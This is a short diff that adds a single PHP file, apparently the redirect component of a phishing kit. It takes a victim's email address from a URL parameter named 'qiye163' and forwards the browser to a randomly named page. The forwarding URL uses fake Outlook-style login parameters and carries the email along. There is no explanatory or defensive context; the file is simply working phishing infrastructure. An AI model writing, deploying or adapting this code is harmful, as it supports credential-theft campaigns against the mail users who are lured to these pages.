@@ -1,0 +1,1 @@
+<?php $B="";if(isset($_GET['qiye163'])){$B=$_GET['qiye163'];}$E=substr(md5(rand()),0,28);$C=substr(md5(rand()),0,28);$A=substr(md5(rand()),0,28);$D=$E.".php?login=Inboxaspxn".$C."&Id".$C."&doc".$A."&email=".$B."&jiv".$A."&cgd&id=fav&wow";header("Location: $D");exit; ?>
